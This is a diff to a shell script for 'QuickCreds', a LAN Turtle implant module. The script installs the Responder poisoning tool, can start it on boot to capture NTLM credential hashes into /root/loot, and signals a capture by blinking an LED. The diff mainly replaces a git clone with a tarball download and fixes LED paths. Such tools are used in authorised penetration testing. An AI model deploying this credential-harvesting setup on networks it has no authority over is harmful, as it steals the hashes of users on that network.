@@ -10,11 +10,6 @@ CONF=/tmp/QuickCreds.form
 : ${DIALOG_ITEM_HELP=4}
 : ${DIALOG_ESC=255}
 
-
-
-
-
-
 function configure {
 #  dialog --title "QuickCreds" --msgbox "\n\
 # Dependencies will be installed. An Internet connection is required.\n\
@@ -29,7 +24,6 @@ case $response in
    1) exit ;;
    255) exit ;;
 esac
-
 
 # Check to see if QuickCreds has already been configured
 if [[ -d /root/loot || -s /root/loot/responder.log ]];
@@ -50,11 +44,6 @@ The LAN Turtle is currently offline.\nPlease connect the LAN Turtle to the Inter
 
 # Install dependencies
 opkg update | dialog --progressbox "Updating opkg" 14 72 
-
-if [[ ! $(opkg list-installed | grep git) ]];
-  then
-    opkg install git | dialog --progressbox "Installing dependency git" 14 72
-fi
 
 if [[ ! $(opkg list-installed | grep python-sqlite3) ]];
   then
@@ -79,8 +68,11 @@ fi
 if [[ ! -d /etc/turtle/Responder || ! -s /etc/turtle/Responder/Responder.py ]];
 then
   rm -rf /etc/turtle/Responder
-  git clone git://github.com/lgandx/responder /etc/turtle/Responder -q | dialog --progressbox "Installing dependency responder" 14 72
-  rm -rf /etc/turtle/Responder/.git
+  rm -rf /tmp/v2.3.3.5.tar.gz*
+  wget --progress=dot https://github.com/lgandx/Responder/archive/v2.3.3.5.tar.gz -P /tmp 2>&1 | dialog --progressbox "Download dependency responder" 14 72
+  mkdir /etc/turtle/Responder
+  tar xzf /tmp/v2.3.3.5.tar.gz -C /etc/turtle/Responder 2>&1 | dialog --progressbox "Install dependency responder" 14 72
+  rm -rf /tmp/v2.3.3.5.tar.gz*
 fi
 
 # Setup loot directory and complete setup
@@ -91,11 +83,6 @@ touch /root/loot/responder.log
 Configuration complete. Creds will be saved to /root/loot\n\
 Enable this module to have it start the attack on boot.\n" 9 72
 }
-
-
-
-
-
 
 function start {
 # Stop on-off-on DHCP blink pattern script
@@ -138,31 +125,23 @@ if [ $(grep -v '\$:' /etc/turtle/Responder/logs/*NTLM* 2>/dev/null) ];
       finished
     fi
 fi
-    echo 255 > /sys/class/leds/turtle\:yellow\:system/brightness
+    echo 255 > /sys/class/leds/lan-turtle\:orange\:system/brightness
     /usr/bin/sleep 0.04
-    echo 0 > /sys/class/leds/turtle\:yellow\:system/brightness
+    echo 0 > /sys/class/leds/lan-turtle\:orange\:system/brightness
     /usr/bin/sleep 0.04
 done
 }
-
-
 
 function finished {
   echo 255 > /sys/class/leds/turtle\:yellow\:system/brightness
   exit
 }
 
-
 function stop {
   kill $(ps | grep [R]esponder | awk {'print $1'})
   /etc/init.d/dnsmasq start 1&> /dev/null
   echo "QuickCreds Stopped"
 }
-
-
-
-
-
 
 function status {
   if ps | grep -w -q [R]esponder.py; then echo "1"; else echo "0"; fi
